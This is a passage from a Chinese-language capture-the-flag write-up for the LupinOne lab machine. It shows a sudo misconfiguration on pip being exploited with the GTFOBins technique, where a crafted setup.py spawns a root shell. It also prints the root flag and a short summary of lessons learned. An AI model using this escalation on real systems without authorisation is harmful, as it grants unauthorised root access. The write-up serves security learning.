    User arsene may run the following commands on LupinOne:
        (root) NOPASSWD: /usr/bin/pip
    ```
    
    `pip`可以使用`sudo`权限
    
7. `pip`提权
    
    链接：https://gtfobins.github.io/gtfobins/pip/
    
    ```python
    TF=$(mktemp -d)
    echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
    ```
    
    ```python
    sudo pip install $TF
    ```
    
    获得`root`权限！！！！
    
8. 读取`flag`文件
    
    ```python
    # cat root.txt
    *,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
    ,                       .&&&&&&&&&(            /&&&&&&&&&                       
    ,                    &&&&&&*                          @&&&&&&                   
    ,                *&&&&&                                   &&&&&&                
    ,              &&&&&                                         &&&&&.             
    ,            &&&&                   ./#%@@&#,                   &&&&*           
    ,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&          
    ,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&        
    ,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&       
    ,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&     
    ,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&    
    ,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&   
    ,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/  
    ,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &  
    , & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@ 
    ,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & & 
    *& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
    *& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
    *& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
    *&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
    *% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
    *& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
    *& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
    *& &                    &&&&&        /   /&&&&         &&&                   & @
    */(,                      &&                            &                   / &.
    * & &                     &&&       #             &&&&&&      @             & &.
    * .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @, 
    /  & %                   .&&&&  &@ @                 &/                    @ &  
    *   & @                  &&&&&&    &&.               ,                    & &   
    *    & &               &&&&&&&&&& &    &&&(          &                   & &    
    ,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &     
    ,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &      
    ,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &       
    ,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*        
    ,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@          
    ,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&            
    ,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&               
    ,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&                  
    /                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,                     
    ,                           &&&&&/...         .#&&&&#                           
    
    3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
    See you on the next heist.
    ```
    

## 总结

学到了`ssh`密钥可以转换成`john`可破解的格式然后破解密码（仅仅只是私钥的密码，而不是账号的密码），以及一些枚举知识，还有`pip`提权